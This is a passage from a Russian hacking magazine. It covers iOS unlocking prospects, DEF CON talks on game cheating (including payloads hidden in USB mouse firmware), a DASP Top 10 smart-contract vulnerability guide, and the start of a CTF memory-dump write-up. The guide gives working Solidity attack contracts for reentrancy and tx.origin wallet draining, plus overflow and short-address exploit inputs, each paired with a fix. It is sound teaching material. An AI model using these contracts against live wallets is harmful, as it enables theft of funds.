на сегодняшний день будет невозможно взломать исключительно техничес‐
кими средствами, не принудив самого пользователя разблокировать устрой‐
ство или сообщить код блокировки.
  А  что ожидается  в ближайшем будущем? Скоро  выходит  iOS  12,
на которую, скорее всего, перейдут практически все пользовате ли iOS
11 и большинство поль зователей ста рых устройств: новая версия системы
работает действительно быстрее предыду щих. Некоторые обозреватели
даже бета‐версии характеризуют словами «новая жизнь для старых устрой‐
ств», и в этом есть значитель ная доля правды. В частности, массовый
переход на iOS 12 означает и массовое рас простра нение режима USB Re‐
stricted Mode.
  Для iOS 11.4 уже найдена и подтверждена уязвимость. Джей лбрейк можно
ожидать со дня на день. Для iOS 11.4.1 уяз вимос тей пока что не обнаружено,
но вероятность, что их найдут, мы оценива ем как высокую. Правда, придется
подождать.
  В бета‐версиях iOS 12 критичес ких уязвимос тей пока не выявили, но веро‐
ятность их обнаружения мы также считаем высокой.
ВЗЛОМ

 САМОЕ КРУТОЕ
  С МИРОВЫХ ИБ-КОНФЕРЕНЦИЙ

       ЛУЧШИЕ ПУБЛИКАЦИИ,
      ПОСВЯЩЕННЫЕ ВЗЛОМУ
            ВИДЕОИГР





Если бы геймер конца девяностых изобрел
машину  времени  и  перенесся  на  ней
в наши дни, он был бы очень удивлен. И его
можно  понять:  в  его  время шикарные
атмосферные  игры  стоили  сто  рублей           Антон Карев                                                                                    Эксперт по информационной
за  диск  и  после  покупки  переходили       безопасности.высшее, специальностьОбразование
в вековечное поль зование. Как может игра      компьютерных«Защита информациисистемах»,в в
требовать с игрока денег ежемесячно, еже‐      настоящийнад диссертацией.момент работаетОбласть
                                                                                     профессиональных
годно,  за  покупку,  страшно  сказать,      интересов — технологическая
                                                                                         разведка, аналитика в сфере
                                                                                      ИБ, искусственныйкакого‐то  внутриигрового  стаффа?  Кто
                                                                                                     интеллект.
                                                                                              vedacoder@mail.ruможет удаленно заблокировать или деин‐
сталлировать   купленную  тобой   игру?
Как «игры в компутер» могут называться
«киберспортом» и почему в нем теперь кру‐
тятся весьма солидные денежки?


Добро пожаловать в будущее, коллега! Поэтому и взламывают сегодня игры
не ради фана, не ради быстрого про хождения или пяти черных драконов
в армию, а все по той же причине — деньги, деньги и еще раз деньги…


ПРЯЧЕМ ГЕЙМЕРСКИЙ ЧИТ-СОФТ ВНУТРИ ПРОШИВКИ USB-
МЫШИ
Mark Williams.  If You Give a Mouse a Microchip...  It will execute
a payload and cheat at your high-stakes video game tournament //
DEF CON. 2017
  На недавнем международном турнире по киберспорту призовой фонд
составил 20 миллионов долларов. Более пяти миллионов игроков были
решительно настроены на  то, чтобы дойти до конца. Естественно, что
при таких высоких ставках на турнирах по киберспорту и при таком количес‐
тве соперников многие игроки хотят смошенничать и получить конкурентное
преимущество.
  Читеры постоянно находят всё новые и новые способы модификации
игрового софта, который использует ся на турнирах по киберспорту, —
от попыток спрятать исполняемые файлы на флеш‐носите лях до применения
читов, сохраненных в сетевом воркшопе Steam. В этом докладе описывается,
как можно обойти продвинутые средс тва безопасности, чтобы тай но пронес‐
ти на целевой компьютер свою «полезную нагрузку».
  Обычно на турнирах по киберспорту игро кам раз решается пользоваться
личными клавиатурой и мышью. Одна ко эти «прос тые» USB‐устрой ства тоже
можно использовать для переда чи команд в компьютер (через HID‐протокол).
Докладчик описывает, как добавить полезную нагрузку к USB‐мыши, осна‐
щенной  процессором ARM  Cortex  M. Микроконтрол лер,  работающий
под управле нием этого процессора, сохраняет пользовательские профили
во внутренней флеш‐памяти, чтобы внутри самой мыши можно было держать
пользовательские настройки сразу для нескольких компьюте ров. Докладчик
демонстрирует, как он модифициро вал прошивку своей мыши, раз местив
в незанятом пространстве ее флеш‐памяти полезную нагрузку, не затрагивая
при этом исходную функциональность мыши.
  Данная концепция применима к любому USB‐устройству.


НА ПОДСТУПАХ К ГЛОБАЛЬНОМУ ЧИТЕРСТВУ В ЭМУЛЯТОРАХ НА
ANDROID
Nevermoe. One Step Before Game Hackers — Instrumenting Android
Emulators // DEF CON. 2018
  Коммерческие эмуляторы Android, такие как BlueStacks и Leidian, весьма
популярны сегодня. Подавляющее большинство игр работают на эму ляторах
достаточно быстро и качественно. Плохая новость для поставщиков игр
в том, что эти эмуляторы, как правило, работа ют с root’овы ми пол номочи ями.
Разработчики читерских утилит радос тно это при ветствуют: им не нужно
отдельно заботиться о том, чтобы самим настраивать root’овые права
для различных версий ОС Android и для раз личных версий прошивки, и рас‐
пространение их утилит зна чительно упрощается.
  Однако повод для радости есть также и у пос тавщиков игр: для увеличения
производительности коммерчес кие Android‐эмуляторы, как правило, исполь‐
зуют смешанную эмуляцию x86/ARM. Стандартные фрей мворки для работы
с хуками и DBI, которыми обычно пользуются изготовители читерских утилит,
не работают на этих платформах. В результате создавать утилиты становится
существенно сложнее.
  В данной презентации докладчик представляет свой собственный фрей‐
мворк для работы с хуками и DBI, который корректно работает в условиях
смешанной эмуляции x86/ARM. Докладчик демонстрирует на живом примере,
как этим фреймворком пользоваться, и по ходу объясняет различные стра‐
тегии эмуляции, которые реализова ны в рас пространенных на сегодняшний
день эмуляторах, с необходимыми деталями относительно рантайм‐сред,
в которых они работают (Dalvik/ART). Также докладчик объясняет, почему
стандартные фреймворки для работы с хуками и DBI не работают на смешан‐
ных эмуляторах.





XENOSCAN — ПРОДВИНУТАЯ УТИЛИТА ДЛЯ СКАНИРОВАНИЯ
ПАМЯТИ ВИДЕОИГР
Nick Cano. XenoScan: Scanning Memory Like a Boss // DEF CON.
2017
   XenoScan — новейшая  утилита для  игровых  читеров. Основываясь
на прочном фундаменте уже давно сущес твующих сканеров (таких как Cheat
Engine и TSearch), XenoScan предлага ет множес тво инноваций, благодаря
которым сканирование памяти ведется на принципиально новом уровне.
В презентации докладчик демонс трирует на живом примере всю мощь сво‐
его инструмента, а также показывает, как XenoScan:
 • отыскивает сложные структуры данных, такие как бинарные деревья и свя‐
   занные списки;
 • отыскивает экземпляры клас сов, обосновавшихся в «куче»;
 • группирует обнаруженные классы в соот ветс твии с их типами.

Также докладчик объясняет, как работать с XenoScan не только с играми,
которые изначально были созданы для компьютера, но и с играми, запущен‐
ными из‐под эмулятора Nintendo. По ходу демонстрации докладчик объ ясня‐
ет низкоуровневые тех ничес кие детали, на базе которых построена работа
XenoScan: что там происхо дит, как это работа ет и почему.
   XenoScan распространяется с открытым исходным кодом.





ХАКЕРЫ СОЗДАЛИ НОВЫХ ИГРОВЫХ МОБОВ ДЛЯ STARCRAFT
ЧЕРЕЗ ОШИБКУ ПЕРЕПОЛНЕНИЯ БУФЕРА
Elias Bachaalany.  StarCraft: Emulating a buffer overflow  for fun
and profit // RECON. 2018
  Версии StarCraft 1.16.1 и ранее были подвержены ошиб ке переполнения
буфера в программном коде парсинга карт. Хакеры из Южной Кореи исполь‐
зовали эту ошибку для создания новых игровых мобов. Эти мобы стали нас‐
только популярными, что у разработ чиков StarCraft возникла дилемма: если
мы исправим эту ошибку, то тем самым убьем этих мобов.
  Докладчик рассказывает о технических трудностях, с которыми придется
столкнуться тем, кто решит пойти по сто пам южно корей ских хакеров. Попутно
он делится хит рыми приемами обратной инженерии, которые применил
для решения этих технических трудностей, рассказывает о написанных им
утилитах для облегчения данной задачи и о том, как разрабаты вал свой собс‐
твенный  эмулятор.  Презентация щедро  снаб жена  исходными  кодами
и бинарными дампами.





TASBOT: ПРОДВИНУТОЕ БОТОВОЖДЕНИЕ НА ИГРОВОЙ КОНСОЛИ
NINTENDO
Allan Cecil. Robot Hacks Video Games: How TASBot Exploits Con-
soles with Custom Controllers // DEF CON. 2016
  Докладчик рассказывает, как уже который год подряд раз вле кает зрителей
и участников AGDQ (мероприятие, на котором гей меры демонстрируют свое
мастерство ско ростного прохождения видеоигр) сво им ботом TASBot. TAS‐
Bot — это примочка, которая подключается к Nintendo R.O.B. и, притворив‐
шись джойстиком игровой консоли, игра ет в игры на невообразимо высоких,
недоступных обычному геймеру скорос тях.
   TASBot манипулирует глюками и зло употребля ет уязвимостями игровой
консоли, чтобы выполнять на ней произвольные опкоды и переписывать
запущенную игру «на лету», в оперативной памяти. Фактически она берет
игровую консоль Nintendo под полный контроль без какой‐либо модификации
ПЗУ консоли или ее программной час ти. Все манипуляции — исключительно
«через джойстик». Архивные видеоза писи, на которых запечатлены сеансы
игры TASbot’а, выглядят как настоящая магия. По крайней мере кажется, что
вещи подобного рода требуют взло ма ПЗУ или манипуляций с опе ративной
памятью при помощи устройств наподобие Game Genie. Однако все, что
делает TASBot, технически осуществимо без модификации изначального
софта и железа.
  Ради развле чения автор написал даже свой собственный клиент чата
Twitch, прямо из игровой консоли взаимодей ствующий с сай том Twitch.tv.
Причем это была фишка 2016 года, а уже в 2017 году на том же мероприятии
(AGDQ) разработчик TASBot’а удивил пуб лику тем, что запустил с игровой
консоли аудиосеанс Skype.





ЭТО ГЕЙМ-ОВЕР, ДЕТКА! ПРОТИВ SMASHBOT’А, НАДЕЛЕННОГО
ИИ, НЕ УСТОИШЬ
Dan Petro. Game over, man! — Reversing Video Games to Create
an Unbeatable AI Player // DEF CON. 2016
  Докладчик рассказывает о SmashBot, своем творении, очень искусно
играющем в культовую игру Smash Bros. Он работает по схожему принципу,
что и бот, представленный в предыду щем докладе, но отличается тем, что
наделен продвинутым ИИ. В отличие от TASBot’а SmashBot побеждает
не только предсказуемых компьютерных мобов, но и живых соперников —
профессиональных игроков (см. пример его игры на YouTube).
  Докладчик рассказывает, что начал разрабаты вать своего бота в ответ
на вызов, который ему бросил один из дру зей: «Ты не сможешь создать ИИ,
который победит меня в Smash Bros». Благода ря сочетанию алгоритмов глу‐
бокого обучения и тренировке бота в игре с живыми игроками SmashBot
научился играть виртуозно. SmashBot даже выс тупал на двух турнирах, где
состязался с лучшими в мире игроками. При этом выигрывал он гораздо
чаще, чем проигрывал.
  Однако нашлась у него и ахиллесова пята, которая погубила подающе го
надежды «молодого спортсмена». Когда противник приседает на корточки
на краю сцены, SmashBot начинает смущаться и кончает жизнь самоубий‐
ством.
   SmashBot распространяется с открытым исходным кодом (см. ссылку на
GitHub).
ВЗЛОМ

БЕЗОПАСНОСТЬ
СМАРТ-КОНТРАКТОВ


 ТОП‐10 УЯЗВИМОСТЕЙ
 ДЕЦЕНТРАЛИЗОВАННЫХ
 ПРИЛОЖЕНИЙ
 НА ПРИМЕРЕ
 СПЕЦИФИКАЦИИ DASP





                                                                             Татьяна Михайлова
                                                                                         @imtatyanaa





Количество смарт‐кон трактов в блокчейне Ethereum только
за первую половину 2018 года выросло в два раза по срав‐
нению с 2017‐м. Соответственно, растет и множество уяз‐
вимостей, векторов атак на децентра лизованные приложе‐
ния. В этой статье мы попробуем упо рядочить уяз вимости
аналогично OWASP Top 10. Кода тебя ждет немало, так что
готовься — легко не будет. :)


Уже обнаружено множество уязвимых контрактов, которые доступны для вза‐
имодействия и по сей день (об этом «Хакер» писал не так давно). И конечно,
совершались атаки: самыми крупными хищениями стали 30 мил лионов дол‐
ларов из Parity и 53 миллиона дол ларов из DAO. И лишь в марте 2018 года
организация NCC Group представила спецификацию уяз вимостей децентра‐
лизованных приложений DASP  (Decentralized  Application  Security  Project)
Top10.
  Для начала давай вспомним, как устроены смарт‐контракты в блокчейне
Ethereum. В Ethereum существует два типа аккаунтов: внешние (аккаунты
пользователей) и аккаунты контрактов, которые принято называть смарт‐кон‐
трактами. Их различие сос тоит в том, что акка унт контракта управля ется толь‐
ко с помощью ассоциированного с ним программно го кода, который выпол‐
няется на EVM (Ethereum Virtual Machine). Каждый смарт‐контракт име ет свое
хранилище и свою память.
  Лю бое действие в блокчейне Ethereum выполняется с помощью тран‐
закций: отправ ка ether с одного акка унта на другой, создание контракта,
обращение к функции контракта. При чем инициировать транзакции могут
только внешние аккаунты, а контракты могут создавать транзакции только
под действием полученных ими транзакций. За каждую транзакцию взимается
комиссия, для этого введена специальная единица — gas. Комиссия рассчи‐
тывается как произведение цены gas и количес тва gas.
  Пишутся кон тракты преиму щественно на языке  Solidity, который ком‐
пилируется в байт‐код и исполня ется в EVM на всех узлах сети. На Solidity
контракт выглядит как класс со своими метода ми и переменными. Обращать‐
ся к контракту можно, используя его ABI (Application Binary Interface).
  А  теперь  давай  подробно  рас смот рим  каж дый  тип  уязвимостей
в смарт‐контрактах и дадим оценку спецификации DASP Top 10.


REENTRANCY
Первое место в списке занимает уязвимость типа Reentrancy, также извес‐
тная как рекурсивный вызов. Проблема кроется в том, что уяз вимый контракт
совершает вызов к дру гому контракту, при этом внешний контракт может
делать ответный вызов функций уяз вимого контракта внутри начального
вызова. Рассмотрим прос той контракт‐кошелек, в котором пользователи
могут хранить свой ether:


contract Vuln {
    mapping (address => uint) private balances;
    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }
    function withdrawSomeMoney(uint _someMoney) public {
        require (_someMoney <= balances[msg.sender]);
        require(msg.sender.call.value(_someMoney)());
        balances[msg.sender] ‐= _someMoney;
    }
}

С первого взгляда найти уязвимость слож но, выглядит все логичным: функция
withdrawSomeMoney() про веря ет, что на счету акка унта дос таточно средств,
затем отправляет их с помощью функции msg.sender.call.value()  и,
наконец, списывает отправленный ether со счета пользователя. Теперь рас‐
смотрим атакующий контракт:


import "vuln.sol"
contract Xakep {
    Vuln public vuln;
    function withdrawFromVuln() {
        vuln.withdrawSomeMoney(100);
    }
    function () payable {
        vuln.withdrawSomeMoney(100);
    }
}

Контракт Xakep внутри функции withdrawFromVuln() вызывает функцию
withdrawSomeMoney() контракта Vuln. Но при отправке токенов функцией
msg.sender.call.value() вызывается  fallback‐функция контракта Xakep.
Это  функция  без  названия,  которая  в  данном  случае  используется
для получе ния контрактом  ether, поэтому она отмечена модификатором
payable. Внутри нее контракт Xakep снова вызыва ет функцию withdrawSomeM‐
oney(), причем важно заметить, что с баланса аккаунта в кошельке ether
еще не списался, значит, проверка дос таточности баланса успешна, и мы
снова попадаем в fallback‐функцию. Так происходит, пока на контракте Vuln
совсем не останется средств. Экс плуатация данной уяз вимос ти привела DAO
к потере около 50 миллионов долларов.
  Безопасно перевести токены можно при помощи функции transfer(),
но если все же необ ходимо использовать вызов аккаунта, то нужно сначала
обновить баланс аккаунта, затем совершать вызов.


УПРАВЛЕНИЕ ДОСТУПОМ (ACCESS CONTROL)
Есть способы стать владельцем чужого контракта или, наоборот, заставить
пользователя авторизоваться в необ ходимом злоумышленнику контракте.
Все это уязвимости контроля дос тупа. Для функций в Solidity существу ют спе‐
цификаторы видимости: private, publuc, internal, external. Функция без спе‐
цификатора авто матически считается public, то есть дос тупна для вызова
отовсюду.


             INFO

                          Private‐функции и гло бальные переменные дос‐
                       тупны исключительно внут ри своего контракта.
                     К  public‐функциям и  гло бальным переменным
                   можно обратиться  как изнутри контракта,  так
                      и  снаружи.   Internal‐функции  и  глобальные
                      переменные  могут  быть  доступны  изнутри
                      текущего кон тракта или из кон трак та‐наследника.
                         External‐фун кции могут быть вызваны из других
                       контрактов или через тран закции и не могут быть
                      вызваны изнутри текущего контрак та.


Использование неподходящих спецификаторов или неиспользование их сов‐
сем может привести к неблагоприятным пос ледствиям. Например, вызов
функции смены владель ца контракта со спецификатором public позволяет
любому аккаунту стать владельцем контракта. Также к данному типу уяз‐
вимостей относится использование tx.origin для опре деления аккаунта,
вызвавшего контракт. Рассмотрим такой пример:


contract Wallet {
    address public owner;
    constructor (address _owner) {
    owner = _owner;
    }
    function () public payable {}
    function withdrawAll(address _luckyAddress) public {
        require(tx.origin == owner);
        _luckyAddress.transfer(this.balance);
    }
}

Контракт Wallet представляет собой кошелек, все средства из которого может
перевести на указанный адрес только его владелец, заданный при создании
контракта. Обрати внимание на стро ку про верки вла дельца в функции with‐
drawAll. Теперь создадим ата кующий контракт.


import "wallet.sol";
contract TrueXakep {
    Wallet poorWallet;
    address attacker;
    constructor (Wallet _poorWallet, address _attackerAddress) {
        poorWallet = _poorWallet;
        attacker = _attackerAddress;
        }
    function () payable {
        poorWallet.withdrawAll(attacker);
    }
}

Используя социальную инженерию, можно зас тавить владельца контракта
Wallet отправить контракту TrueXakep некоторое количество ether. В этом слу‐
чае исполнится fallback‐функция, из которой происходит вызов функции
withdrawAll контракта Wallet. А теперь раз беремся, какое значение имеет
tx.origin. tx.origin — это гло бальная переменная в Solidity, которая при‐
нимает  значение  адреса  исходного  аккаунта,  вызвавшего  функцию
или отправив шего транзакцию. В нашем случае tx.origin — это адрес вла‐
дельца контракта Wallet, так как имен но он породил последовательность
вызовов. Таким образом, проверка успешно проходит, и весь ether с кошель‐
ка переводится зло умышленнику.
   Чтобы такого не происходило, необ ходимо использовать переменную
msg.sender для определения акка унта, вызвавшего функцию. msg.sender —
это адрес аккаунта, который непосредственно сделал вызов или отправил
транзакцию. В данном слу чае это адрес контракта TrueXakep.
  К этой категории уяз вимос тей также отно сится неправильное исполь‐
зование  delegatecall. Это  низкоуровневая функция,  которая  позволяет
исполнять функции сто роннего контракта в контексте вызывающего контрак‐
та. То есть при исполнении функции стороннего контракта используется хра‐
нилище вызывающего контракта, и зна чения msg.call и msg.value остаются
первоначальными. Вторая ата ка на Parity основана на использовании dele‐
gatecall и повторной инициализации контракта‐биб лиотеки, в результате чего
пользователь смог стать его владельцем и уда лить контракт. Все средства
в Parity остались заморо женными, так как функция вывода средств вызыва‐
лась из удаленного контракта. Сооб щение о том, что пользователь случайно
удалил контракт, находится на GitHub Parity.





             Сообщение об уда лении контракта Parity


АРИФМЕТИЧЕСКИЕ ОСОБЕННОСТИ (ARITHMETIC ISSUES)
Уязвимости целочисленного переполнения, как и в других языках, возникают
из‐за ограниченного раз мера памяти, выделенного на переменную. Мак‐
                                                                      256симальное значение для переменной типа  uint  (uint256) равно 2   −1,
минимальное — 0. Выйти за эти границы не получится: значение либо обну‐
лится (при перепол нении вверх), либо станет максимальным (при перепол‐
нении вниз).
  Мы не будем рассматривать простые примеры, в которых арифметические
действия выполняются без проверок. Рас смот рим уяз вимость в функции
batchTransfer, которую исполь зуют многие реальные контракты.


function batchTransfer(address[] _receivers, uint256 _value) public
whenNotPaused returns (bool) {
    uint cnt = _receivers.length;
    uint256 amount = uint256(cnt) * _value;
    require(cnt > 0 && cnt <= 20);
    require(_value > 0 && balances[msg.sender] >= amount);
    balances[msg.sender] = balances[msg.sender].sub(amount);
    for (uint i = 0; i < cnt; i++) {
        balances[_receivers[i]] = balances[_receivers[i]].add(_value)
;
        Transfer(msg.sender, _receivers[i], _value);
    }
    return true;
}

Функция batchTransfer() перечисляет заданное в _value количес тво ether
на адреса из массива _receivers. Обрати вни мание на строку вычисления
amount, переполнение в которой никак не проверя ется. Если задать значение
                 256_value равным 2    / _receivers.length, то в результате переполнения amount
примет значение 0. Обе про верки далее прой дут успешно, в том числе и про‐
верка того, что баланс отпра вителя больше amount. В итоге балансы получа‐
телей будут пополнены на величину _value. Если получателей было два, то
каждый из них получит по


2^256/2=2^255=0x8000000000000000000000000000000000000000000000000
000000000000000

токенов.
  Для исключения подоб ных уязвимостей рекомендуется использовать биб‐
лиотеку SafeMath от OpenZeppelin.


ОТСУТСТВИЕ ПРОВЕРКИ ВОЗВРАЩАЕМЫХ ЗНАЧЕНИЙ
НИЗКОУРОВНЕВЫХ ВЫЗОВОВ (UNCHECKED RETURN VALUES FOR
LOW LEVEL CALLS)
Существует три способа отпра вить ether на сторонний аккаунт: transfer(),
send() и call(). Последние две функции при возникновении ошибки воз‐
вращают false, но транзакция продолжает выполняться. Функция transfer()
в таком случае откатит транзакцию. Также необ ходимо отслеживать возвра‐
щаемое значение низкоуровневых функций callcode(), delegatecall().
Они тоже не откатывают транзакцию, если воз вра щается результат false. Рас‐
смотрим уязвимость на примере:


function give_presents(address[] _winners) private {
    uint len = _winners.length;
    for (uint i=0; i<len; i++) {
        _winners[i].send(10);
    }
}

Функция из примера отправляет подарки победителям из массива _winners.
Поскольку возвращаемое значение функции send не проверяется, может слу‐
читься так, что не все победители получат свои подарки. Поэтому рекомен‐
дуется для всех переводов средств использовать функцию transfer().


ОТКАЗ В ОБСЛУЖИВАНИИ (DENIAL OF SERVICE)
К этой категории отно сят мно жес тво уязвимостей, которые могут привести
к неработоспособ ности смарт‐контракта. Преобра зуем функцию give_pre‐
sents таким образом, чтобы проверялось возвращаемое функцией send зна‐
чение.


function give_presents(address[] _winners) private {
    uint len = _winners.length;
    for (uint i=0; i<len; i++) {
        require(_winners[i].send(10));
    }
}

Проверкой require исключена уяз вимость предыдущего пункта, однако сейчас
если один победитель не сможет получить свой выигрыш, то остальные тоже
его не получат.
  А теперь представим, что количество победителей не ограничено и выиг‐
рыш выплачивается всем одновременно. Зло умышленник может зарегистри‐
ровать много аккаунтов, которые ста нут победителя ми. Для выполнения
вызовов в цикле может потребоваться большое количество gas, которое пре‐
высит лимит gas в блоке, и такая транзакция не будет выполнена. Для гаран‐
тированной выплаты выигрышей всем победителям сле дует разделить боль‐
шой цикл на несколь ко, каж дый из которых будет выполняться в отдельной
транзакции.


ПРОБЛЕМА ПСЕВДОСЛУЧАЙНЫХ ЧИСЕЛ (BAD RANDOMNESS)
Блокчейн Ethereum основан на детерминированном алгоритме, поэтому
получение случайных чисел — задача трудная. Источниками псевдослу чайных
чисел НЕ могут выступать:
 • переменные контракта, даже отмеченные спецификатором private;
 • переменные блока;
 • хеш предыдущего и даже будущего блока.

Во всех этих вариантах псевдослучайные числа могут быть предугаданы.
Более надежные способы генера ции псевдослучайных чисел — исполь‐
зование внешних источников, алго ритм Signidice, подход Commit — Reveal.
  Подробно о проб леме генераторов псевдослучайных чисел уже писали
в Хакере.


ОПЕРЕЖЕНИЕ (FRONT-RUNNING)
В Ethereum все транзакции сна чала добавляются в пул, который виден всем
участникам сети, а далее майнеры добавляют их в блок в произвольном
порядке. Поэтому результат выполнения транзакции не должен зависеть
от ее положения в блоке. Рассмотрим пример:


contract SolveTheHash{
    address public owner;
    bool public solved;
    uint public reward;
    bytes32 public diff;
    bytes public solution;
    constructor(){
        owner = msg.sender;
        reward = msg.value;
        solved = false;
        diff = bytes32(11111); // Сложность
    }
    function(){
        if (msg.data.length > 0){ // Отправка решения
            if (locked) throw;
            if (sha256(msg.data) < diff){
                msg.sender.send(reward); // Отправка вознаграждения
                solution = msg.data;
                solved = true;
            }
        }
    }
}

Контракт представляет собой конкурс на поиск числа, хеш от которого мень‐
ше заданного значения. Допустим, ты нашел подходящее решение и отпра‐
вил транзакцию с ответом. Нечестный игрок может подсмотреть твой ответ
в пуле транзакций и отправить такой же. При отправке транзакции нужно ука‐
зать цену gas, которую ты готов заплатить, чтобы твоя транзакция выпол‐
нилась. Чем выше цена gas, тем больше веро ятность транзакции быть добав‐
ленной в блок раньше. Таким обра зом, злоумыш ленник, выставив цену gas
выше, сможет выиграть конкурс.
   Частично решит проб лему добавление в контракт ограничения на цену
gas, но майнеры все равно смогут манипулировать порядком транзакций.
Более правильным, но сложным решением будет схема Commit — Reveal,
как и в пре дыдущем пункте. В данном случае пользователям предлагается
сначала отправлять хеш от найденного числа. Пос ле добавления этой тран‐
закции в блок пользователь отправляет найденное число. Результат проверя‐
ется, награждается победитель.


ЗАВИСИМОСТЬ ОТ ВРЕМЕНИ (TIME MANIPULATION)
В Solidity перемен ная now соот ветствует глобаль ной переменной block.
timestamp, которую зада ет майнер, поэтому использовать ее в качес тве
источника энтропии нельзя.


contract Auction {
    uint jackpot = 100 ether;
    uint public lastBid = 1 ether;
    constructor() public payable {}
    function setBid() public payable {
        require(msg.value >= lastBid);
        if (now%20 == 0){
            msg.sender.transfer(jackpot);
        }
    }
}

Контракт представ ляет собой гиб рид аукциона и лотереи: участники отправ‐
ляют ставки, выигрывает тот, время ставки которого удовлетворяет опре‐
деленному условию. Для гарантированного выигрыша майнер может уста‐
новить подходящее значение block.timestamp и смайнить блок со своей
выигрышной транзакци ей.


МАНИПУЛИРОВАНИЕ ДЛИНОЙ АДРЕСА (SHORT ADDRESS ATTACK)
Для  вызова  функций  контрактов  используется  ABI  (Application  Binary
Interafce) — бинарный интерфейс приложения, сог ласно которому вызов фун‐
кции представляется в виде последовательнос ти байтов. Первые четыре бай‐
та — это начало хеша keccak256 от подписи функции (ее название и типы
входных данных), далее идут значения входных параметров.


function transfer(address to, uint amount) public returns (bool
success);

Адрес в Ethereum состоит из 20 байт. Для осущест вле ния атаки злоумыш‐
леннику нужно сгенерировать адрес, который заканчивается на нулевой байт,
например abcdabcdabcdabcdabcdabcdabcdabcdabcdab00. В обычном случае
вызов функции на перевод 1 ether будет выглядеть так (вертикальной чертой
разделены составляющие последовательнос ти):


a9059cbb|000000000000000000000000abcdabcdabcdabcdabcdabcdabcdabcd
abcdab00|000000000000000000000000000000000000000000000000000
0000000000001

Но если указать адрес abcdabcdabcdabcdabcdabcdabcdabcdabcdab без пос‐
леднего байта, то недостающий байт адреса будет взят из следующего аргу‐
мента (amount), а в конец EVM допишет нулевой байт:


a9059cbb|000000000000000000000000abcdabcdabcdabcdabcdabcdabcdabcd
abcdab|00000000000000000000000000000000000000000000000000000
0000000000100

Получается, вместо 1 ether жертва отпра вит 0x100=256 ether. Защититься
от такой атаки поможет только тщательная проверка параметров перед заг‐
рузкой их в блокчейн.


НЕНАЙДЕННОЕ (UNKNOWN UNKNOWNS)
Так как область еще развивается, язык программирования Solidity постоянно
дорабатывается, авторы DASP верят, что будут най дены новые типы уяз‐
вимостей, которые пополнят эту коллекцию.


ЗАКЛЮЧЕНИЕ
Рассмотренная классификация, с одной стороны, объединяет в категорию
множество разных уязвимостей, с другой — не учитывает некоторые из них
совсем. Например, уязвимости контроля дос тупа следовало бы разделить
на отдельные типы, особенно связанные с использовани ем delegatecall
для работы с контрактами‐библиотеками. В эту группу можно добавить уяз‐
вимости прокси‐контрактов, которые перенап равляют вызов на контрак‐
ты‐библиоте ки. Также в классифика ции не ука заны проблема неинициали‐
зированных  переменных  в  хранилище  и  возможность  отправки  ether
смарт‐контракту, который это го не ожидает.


        WWW

                   •DASP Top 10
                      •Альтернативный  список  известных  векторов
                           атак и антипаттернов Solidity
ВЗЛОМ

CTFZONE 2018:
  PRIVATE_PROBLEM





    РАЗБИРАЕМ СЛОЖНОЕ ЗАДАНИЕ
       НА РЕВЕРС И ФОРЕНЗИКУ
        С ЕЖЕГОДНОГО CTF
         КОМПАНИИ BI.ZONE





Закончился онлайновый  этап ежегодных
соревнований CTFZone, которые проходят
уже третий год подряд. Луч шие десять
команд  отборочного  тура  приглашены
на финал CTFZone 2018, который состоится          Егор Василенко                                                                                           vasilenko.yegor@gmail.com
на  конференции  OFFZONE  в  ноябре.
По традиции команды ждет ожесточен ная
битва в формате Attack/Defense.


Здесь же мы разберем одно из наиболее сложных заданий онлайнового эта‐
па — задание на реверс и форензику под названием private_problem. Этот
таск решила только одна команда из Рос сии — LC↯BC.


ПОСТАНОВКА ЗАДАЧИ
В качестве исходных данных предос тавляется файл server.dmp. Необ ходимо
найти содержимое файла ﬂag.txt.


ПОДГОТОВКА К АНАЛИЗУ ФАЙЛА SERVER.DMP
Исходный файл имеет формат MDMP. Как пра вило, файлы такого формата
создаются операционной системой при воз никновении опре деленных сбоев.
Кроме того, аналогич ный файл можно соз дать самос тоятельно. Например,
при отладке про цесса в Visual Studio или при помощи специализированных
утилит (см. скриншот).





       Создание файла MDMP при помощи ути литы Process Explorer

Для статического анализа MDMP‐файла откроем его в IDA Pro.





             Состояние процесса в момент снятия дампа





     Окно с модулями, заг руженными в память в момент снятия дампа

На втором скриншоте видно, что дамп был сделан в момент выполнения инс‐
трукции внутри процесса server.exe. Чтобы проанализировать память процес‐
са server.exe, необ ходимо найти базовый адрес текущей функции и опре‐
делить ее в IDA Pro.





                   Текущая функция до определения





  Состояние процесса в момент снятия дампа пос ле опре деления
  и декомпиляции текущей функции

Аналогичным  образом  определяем  все  вложенные  функции,  которые
не определились автоматичес ки.


АНАЛИЗ ПАМЯТИ ПРОЦЕССА SERVER.EXE
Чтобы понять, как процесс server.exe свя зан с фай лом ﬂag.txt, вос становим
логику его работы.


Восстановление логики работы про цесса server.exe
Первым делом процесс server.exe инициализирует сетевое взаимодействие
с клиентом. Псевдокод функции инициализации после пере именования стан‐
дартных имен и создания необходимых структур данных изображен ниже.





  Псевдокод функции инициализации сетево го взаимодей ствия с кли‐
  ентом

После успешной инициализации сетевого вза имо действия клиенту отправ‐
ляется строка "Tell me your secrets\n".





               Первичное вза имо действие с клиентом

Затем на стороне клиента и на стороне сервера генерируется пара ключей
Диффи — Хеллмана с последу ющим экспортом пуб личного ключа в структуру
вида PUBLICKEYBLOB.
   Рассмотрим функцию генера ции ключей.





           Генерация ключей шифрования на стороне сервера

В данном случае протокол Диффи — Хеллмана реализован согласно до‐
кументации Microsoft. В качес тве открытых параметров Диффи — Хеллмана
на стороне клиента и на стороне сервера используются стандартные зна‐
чения модуля и генератора, ука занные в источнике. Секретный параметр
Диффи — Хеллмана генерируется случайным обра зом при вызове функции
CryptSetKeyParam с аргу ментом KP_X.
   Псевдокод функции экспорта пуб личного ключа изображен ниже.





    Псевдокод функции экспорта пуб личного ключа Диффи — Хеллмана

После генерации и экспорта ключей Диффи — Хеллмана сервер и клиент
обмениваются публичны ми ключами, а также на обеих сторонах генерируется
общий сессионный ключ.
  Далее представлена реализация следующих действий:
 • получение блоба публичного клю ча Диффи — Хеллмана, сгенерирован‐
   ного на клиенте, и импорт общего сес сионного ключа;
 • отправка блоба публичного ключа Диффи — Хел лмана, сге нерированного
   локально.





       Обмен публичными ключами между клиентом и сервером





            Импорт сес сионного клю ча шифрования

Из рисунка видно, что общий сес сионный ключ импорти руется для шиф‐
рования данных с помощью алго ритма RC4. Аналогично ключ должен
импортироваться на стороне клиента пос ле получения тем блоба публичного
клю ча Диффи — Хеллмана, сгенерированного сервером.
  После согласования сессионного клю ча шифрования на стороне сервера
